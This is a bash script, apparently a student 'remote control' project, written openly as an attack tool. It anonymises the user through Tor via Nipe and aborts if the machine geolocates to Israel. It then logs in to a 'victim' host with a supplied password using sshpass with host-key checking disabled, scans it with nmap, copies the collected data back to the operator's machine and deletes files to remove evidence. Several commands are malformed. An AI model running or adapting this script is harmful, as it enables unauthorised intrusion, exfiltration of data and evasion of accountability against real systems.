#!/bin/bash

## Guy Evenchen Project 1 -REMOTE CONTROL v2 ##



# Copyright © Guy_Evenchen 2023-2024

#All rights reserved. This script is the intellectual property of Guy Evenchen. You may use, modify, and distribute this script for educational and non-commercial purposes only. Any unauthorized use, reproduction, or distribution is strictly prohibited. [Your Name] assumes no responsibility for any damages or liabilities arising from the use of this script.

# For inquiries, please contact https://www.linkedin.com/in/guy-evenchen/ .



##Default Var settings##

HOME=$(pwd)

DIRECTORY=$HOME/AnonymousScannedFolder

IP=$(sudo curl https://icanhazip.com )

COUNTRY=$(geoiplookup $IP | awk '{print$4}'| sed 's/,/ /g')

##Coloring stext##

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'
############################################################




##Trasfering data to local host and removing traces and closing servicesss##

function FilesFormRHostToLHost(){
	read -p" (*) Please Enter the local Host IP address to tranfer the Scanned Log:" LocalHostIP
	read -p" (*) Please Enter the local Host Password:" LocalHostPassword
	sleep 2
	echo -e "${RED} => Transferring information to local host.."
	sleep 2
	sshpass -p "$LocalHostPassword" ssh -o StrictHostKeyChecking=no $(whoami)@$LocalHostIP
	sshpass -p "$LocalHostPassword" scp -o StrictHostKeyChecking=no /home/kali/Desktop/AnonymousScannedFolder $(whoami)@$LocalHostIP:/home/kali/Desktop/Results
	sleep 2
	echo -e "${BLUE} => Removing evidence again"
	sshpass -p "$LocalHostPassword" ssh -o $(whoami)@$LocalHostIP rm -r '/home/kali/Desktop/AnonymousScannedFolder'
	echo -e "${BLUE} => File Transferred!"
	sleep 2
	echo -e "${BLUE}  => Disabling SSH Service"
	sudo service ssh stop
	sleep 2
	echo -e "${BLUE}====--Attack done ︻デ═一  bye bye---===="
	sleep 4
	exit
	
	}



##ssh + sshpass connection to victim system##

function RunningSSHConnection(){
    sleep 1
    echo " => Getting ready to breach victim system.."
    sleep 2
    echo " => Enabling SSH Service.."
    sudo service ssh start
    sleep 2
    echo "(*) Please enter the victim IP address or Domain: "
    read victimIP
    sleep 2
    echo "(*) Please enter the victim machine password: "
    read -s victimPass
    sleep 2
    echo " => Showing what ports are open on the victim machine: "
    sudo nmap $victimIP -sV | head -6 | tail -1
    sleep 4
    sudo ifconfig | head -2 | tail -1 | awk '{print$2}' <<<$LocalHostIP
    sleep 2
    echo -e " => Connecting to victim ( ͡° ͜ʖ ͡°)=ε/̵͇̿̿/'̿ ̿ ̿ "
    sleep 1
    echo -e " => Connected, We are in!"
    sleep 1
    sshpass -p "$victimPass" ssh -o StrictHostKeyChecking=no $(whoami)@$victimIP
    sshpass -p $victimPass ssh -o $(whoami)@$victimIP "sudo -S cd Desktop"
    sleep 2
    echo -e "{BLUE}Generating information about the victim.."
    sleep 2
    echo -e "${BLUE}Showing victim Details: $victimIP"
    sleep 1
    sshpass -p "$victimPass" ssh -o $(whoami)@$victimIP "sudo -S uptime"
    echo -e "{BLUE}System information: "
    sleep 1
    sudo -s whois "$victimIP" | awk '{print $1,$2}' | head -40 | tail -6 > Remoteinfo.txt
    echo -e "${BLUE} Showing more Info: "
    sshpass -p "$victimPass" ssh -o $(whoami)@$victimIP "sudo -S nmap $victimIP -sV | head -8 > Remoteinfo.txt"
    echo -e " => Transferring information to remote host"
    sleep 2
    sshpass -p "$victimPass" scp Remoteinfo.txt $(whoami)@$LocalHostIP:/home/Kali/Desktop/AnonymousScannedFolder
    echo " => Removing Evidences (◣_◢) "
    sleep 1
    sshpass -p "$victimPass" ssh -o $(whoami)@$victimIP "sudo -S rm /home/kali/Desktop/Remoteinfo.txt"
    sleep 1
    echo "Done ( ͡ᵔ ͜ʖ ͡ᵔ )"
}


##Running Nipe/tor##

function RunningNipeScript(){
	
	cd nipe
	echo -e "${BLUE} => Running Nipe Tool"
	echo -e "${BLUE} => Becoming Anonymous"
	sleep 1
	sudo -s perl nipe.pl restart
	sudo -s perl nipe.pl restart
	sudo -s perl nipe.pl status
		
	if [ "$COUNTRY" == "IL" ]
	then
		echo -e "${RED} $(whoami) is_𝐍𝐨𝐭_anonymous!! exiting tool..."
		sleep 2
		exit
	else
		echo "Hey $(whoami) you are  A⃣  n⃣   n⃣   o⃣   n⃣   y⃣   m⃣   o⃣   u⃣   s⃣  My friend XD "
		sleep 2
		
		RunningSSHConnection
		
	fi
}


##Installing Nipe and another tools##

function InstallTools(){
	
	sudo $DIRECTORY
	echo -e "${RED}[+] Checking machine version and updating it. :)"
	sudo apt-get update > /dev/null 2>&1
	echo -e "${RED}[+] Machine is updated :)"
	sleep 1
	echo "[+] Nipe is not installed, Installing now :)"
	sudo -s git clone https://github.com/htrgouvea/nipe > /dev/null 2>&1
	sudo -s cd nipe
	sudo -s cpan install try::Tiny Config::Simple JSON > /dev/null 2>&1
	sudo -s perl nipe.pl install > /dev/null 2>&1
	sleep 1
	echo -e "${RED}[+] Installing sshpass .."
	sudo -s apt-get install sshpass > /dev/null 2>&1
	sleep 1
	echo -e "${RED}[+] Installing SSH .."
	sudo -s apt-get install ssh > /dev/null 2>&1
	sleep 1
	echo -e "${RED}[+] Installing GeoIPLookup .."
	sudo apt-get install geoip-bin > /dev/null 2>&1
	sleep 1
	echo -e "${RED}[+] Installation is Done!"
	sleep 4
	
	RunningNipeScript
}



##Checking if directory existed and running Nipe, if not installing tools and then running Nipe##

function CheckNipeScript(){
	if [ -d "$HOME/AnonymousScannedFolder" ]
	then		
		RunningNipeScript
	else
		InstallTools
	fi
}


##Starting the Script##

function StartScript(){
	echo "[+]Please Make sure that you are connected to the Internet before running the script![+] "
	
	if [ -d "$HOME/AnonymousScannedFolder" ] > /dev/null 2>&1
	then
		CheckNipeScript
	else 
		mkdir $HOME/AnonymousScannedFolder > /dev/null 2>&1
	
		echo " Creating New Directory: AnonymousScannedFolder "
		
		CheckNipeScript 
	fi
	
}
	
StartScript



